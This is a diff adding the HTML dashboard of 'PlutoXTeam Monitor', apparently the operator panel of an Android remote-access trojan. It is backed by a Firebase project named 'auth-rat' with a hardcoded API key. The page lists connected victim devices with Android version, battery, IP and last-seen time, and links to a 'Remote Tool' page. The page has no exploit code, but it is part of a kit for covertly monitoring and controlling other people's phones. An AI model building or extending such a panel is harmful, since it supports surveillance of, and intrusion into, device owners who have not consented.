@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>PlutoXTeam Monitor</title>
+
+<link rel="stylesheet" href="css/style.css">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script src="js/theme.js"></script>
+</head>
+
+<body>
+
+<div class="layout">
+<div class="sidebar-overlay"></div>
+
+<aside class="sidebar">
+
+<a href="index.html" class="brand">
+<img src="img/logo.jpg" style="height:32px;width:32px;border-radius:6px">
+PlutoXTeam
+</a>
+
+<div class="nav-title">Main</div>
+
+<a href="index.html" class="nav-link active">All Devices</a>
+<a href="remote.html" class="nav-link">Remote Tool</a>
+
+<!-- LOGOUT BUTTON -->
+<a href="#" id="logoutBtn" class="nav-link" style="margin-top:auto;color:#ef4444;font-weight:700">
+Logout
+</a>
+
+</aside>
+
+<main class="content">
+
+<div class="mobile-header">
+<button class="mobile-toggle">☰</button>
+<div class="mobile-brand">PlutoXTeam</div>
+</div>
+
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem">
+<h1>Dashboard</h1>
+<div id="connection-status" class="status-badge">Connecting...</div>
+</div>
+
+<div class="stats-grid">
+<div class="stat-card">
+<div class="stat-value" id="total-devices">0</div>
+<div class="stat-label">Total Devices</div>
+</div>
+<div class="stat-card">
+<div class="stat-value" id="online-devices">0</div>
+<div class="stat-label">Online</div>
+</div>
+<div class="stat-card">
+<div class="stat-value" id="offline-devices">0</div>
+<div class="stat-label">Offline</div>
+</div>
+</div>
+
+<div class="card">
+<h2>Connected Devices</h2>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Status</th>
+<th>Device</th>
+<th>Android</th>
+<th>Battery</th>
+<th>IP</th>
+<th>Last Seen</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody id="devices-table-body">
+<tr><td colspan="7" style="text-align:center">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+
+</main>
+</div>
+
+<div class="footer">Powered by PlutoXTeam</div>
+
+<!-- ================= FIREBASE CONFIG ================= -->
+<script>
+firebase.initializeApp({
+apiKey:"AIzaSyCg5jaxHtALGbHssWD6sk7EklZsj3EFSLk",
+authDomain:"auth-rat.firebaseapp.com",
+projectId:"auth-rat",
+storageBucket:"auth-rat.appspot.com",
+messagingSenderId:"211012554206",
+appId:"1:211012554206:web:f0697a1b9289659754a14f"
+});
+
+const auth = firebase.auth();
+
+/* ===== AUTH GUARD (ANTI MENTAL) ===== */
+auth.onAuthStateChanged(user=>{
+if(!user){
+location.replace("login.html");
+}
+});
+
+/* ===== LOGOUT ===== */
+document.getElementById("logoutBtn").onclick=()=>{
+auth.signOut().then(()=>{
+location.replace("login.html");
+});
+};
+</script>
+
+<!-- SCRIPT ASLI (TIDAK DIHAPUS) -->
+<script src="js/firebase_config.js"></script>
+<script src="js/ui.js"></script>
+<script src="js/app.js"></script>
+
+</body>
+</html>
